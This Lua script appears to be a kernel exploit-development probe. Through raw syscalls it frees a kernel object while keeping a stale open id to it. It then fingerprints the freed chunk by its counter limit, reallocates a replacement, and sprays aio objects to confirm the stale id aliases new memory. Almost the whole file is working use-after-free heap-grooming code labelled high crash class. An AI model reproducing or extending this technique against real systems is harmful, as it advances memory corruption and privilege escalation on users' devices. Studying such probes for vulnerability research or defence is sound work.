-- CRASH_CLASS: HIGH
-- PROBE 830a: pin the freed chunk's limit with two bracketing probes
--
-- 555(id,n) with n > 0 answers 0 iff counter + n <= limit, and stores the sum, so
-- a pair of calls brackets the limit: (0 then -1) pins it between the two n values.
--   create(a3=0,a4=L) -> counter 0, limit L
--   555(id, L)   -> 0        (counter becomes L)
--   555(id, 1)   -> -1       (L+1 > L)
-- That pair is a fingerprint. If a stale open id produces the fingerprint of a
-- *different* limit after the object was freed, the stale id is reading whatever
-- now occupies the chunk - the aliasing we need.

print("=== PROBE 830a: limit fingerprint through a stale id ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function mkname(s)
    local p = memory.alloc(0x40)
    for i = 0, 0x3F do memory.write_byte(p + i, 0) end
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    return p
end
local function call(sc, ...)
    local a = {...}
    local ok, r = pcall(function() return sc(unpack(a)) end)
    return to_num(r or 0)
end

local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
local sc555 = make_syscall(555)
local sc669 = make_syscall(669)

local function finger(sc, id, L, tag)
    local a = call(sc, uint64(id), uint64(L))
    local b = call(sc, uint64(id), uint64(1))
    print(string.format("  %s: 555(%X)=%s  555(1)=%s   -> %s", tag, L, hx(a), hx(b),
        (a == 0 and b ~= 0) and ("limit ~ 0x" .. string.format("%X", L)) or "no fingerprint"))
end

-- [A] baseline: a live object created with limit 0x110
do
    local n = mkname("fp1")
    local id = call(sc549, n, uint64(0x101), uint64(0), uint64(0x110))
    print(string.format("[A] create(a3=0,a4=0x110) = %s", hx(id)))
    finger(sc555, id, 0x110, "live")
    finger(sc555, id, 0x10, "live again")
    call(sc550, uint64(id))
end

-- [B] retire one object, keep an open id, then look at the chunk
local n = mkname("fp2")
local id0 = call(sc549, n, uint64(0x101), uint64(0), uint64(0x110))
local id1 = call(sc551, n)
print(string.format("[B] create(a4=0x110)=%s open=%s", hx(id0), hx(id1)))
print(string.format("[B] 550(create)=%s", hx(call(sc550, uint64(id0)))))
print("[C] the freed chunk, fingerprinted through the stale open id")
finger(sc555, id1, 0x1000, "freed")
finger(sc555, id1, 0x100, "freed")

-- [D] allocate a replacement object with a different limit and fingerprint again
local newid = call(sc549, mkname("fp3"), uint64(0x101), uint64(0), uint64(0x200))
print(string.format("[D] replacement create(a4=0x200) = %s", hx(newid)))
print(string.format("[D] its own id: "));
finger(sc555, newid, 0x200, "replacement")
print("[D] the stale id against the replacement:")
finger(sc555, id1, 0x200, "stale")

-- [E] free another object and fill the bin with aio objects (0x58 each)
local n2 = mkname("fp4")
local b0 = call(sc549, n2, uint64(0x101), uint64(0), uint64(0x140))
local b1 = call(sc551, n2)
print(string.format("[E] create(a4=0x140)=%s open=%s", hx(b0), hx(b1)))
print(string.format("[E] 550(create)=%s", hx(call(sc550, uint64(b0)))))
local data = memory.alloc(0x200)
for i = 0, 0x1FF do memory.write_byte(data + i, 0x42) end
local out = memory.alloc(0x40)
for i = 1, 6 do
    local r = call(sc669, uint64(0x1001), uint64(to_num(data)), uint64(1), uint64(1), uint64(to_num(out)))
    if i == 1 or r ~= 0 then print(string.format("[E] aio create %d = %s", i, hx(r))) end
end
print("[E] stale id after the aio spray:")
finger(sc555, b1, 0x140, "sprayed")
finger(sc555, b1, 0x1000, "sprayed")

print("[F] alive=true")
print("=== PROBE 830a COMPLETE ===")
